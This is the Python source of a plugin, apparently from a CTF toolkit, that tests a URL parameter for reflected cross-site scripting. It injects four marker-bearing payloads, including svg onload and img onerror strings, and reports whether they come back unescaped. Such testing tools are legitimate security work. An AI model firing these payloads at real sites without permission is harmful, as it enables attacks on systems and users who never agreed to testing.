"""Reflected XSS probe: inject unique markers and detect unescaped reflection."""

from __future__ import annotations

import argparse

from rich.table import Table

from syctf.core.types import ExecutionContext
from syctf.utils.net_utils import http_get

_MARKER = "sYcTf7X"
# (label, payload) — payload embeds the marker so we can find it verbatim.
_PAYLOADS = [
    ("raw", f"{_MARKER}"),
    ("html-tag", f"<svg/onload=alert({_MARKER})>"),
    ("attr-break", f'"><img src=x onerror=alert({_MARKER})>'),
    ("js-string", f"';alert({_MARKER});//"),
]


def reflects_unescaped(body: str, payload: str) -> bool:
    """True when the exact payload appears unescaped in the response body."""

    if payload not in (body or ""):
        return False
    # If the dangerous chars were entity-encoded, it is not exploitable as-is.
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    return not (escaped in body and payload != escaped and ("<" in payload or ">" in payload))


class XssProbePlugin:
    """Check a FUZZ injection point for reflected, unescaped output."""

    name = "xss-probe"
    description = "Reflected XSS: inject markers and detect unescaped reflection"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--url", required=True, help="URL with FUZZ at the injection point")

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        template = str(args.url)
        if "FUZZ" not in template:
            context.console.print("[bold red]--url must contain FUZZ.[/bold red]")
            return 2

        timeout = max(6.0, float(getattr(context.config, "request_timeout", 12.0)))
        context.logger.info("web xss-probe url=%s", template)
        from urllib.parse import quote

        table = Table(title="XSS reflection")
        table.add_column("Context", style="cyan")
        table.add_column("Reflected", style="white")
        table.add_column("Payload", style="dim")
        vuln = False
        for label, payload in _PAYLOADS:
            resp = http_get(template.replace("FUZZ", quote(payload, safe="")), timeout=timeout)
            if resp is None:
                table.add_row(label, "error", payload)
                continue
            if reflects_unescaped(resp.text, payload):
                vuln = True
                table.add_row(label, "[green]UNESCAPED[/green]", payload)
            elif payload in (resp.text or ""):
                table.add_row(label, "[yellow]escaped[/yellow]", payload)
            else:
                table.add_row(label, "no", payload)

        context.console.print(table)
        if vuln:
            context.console.print("[bold green]Reflected XSS likely — payload returned unescaped.[/bold green]")
        return 0


plugin = XssProbePlugin()
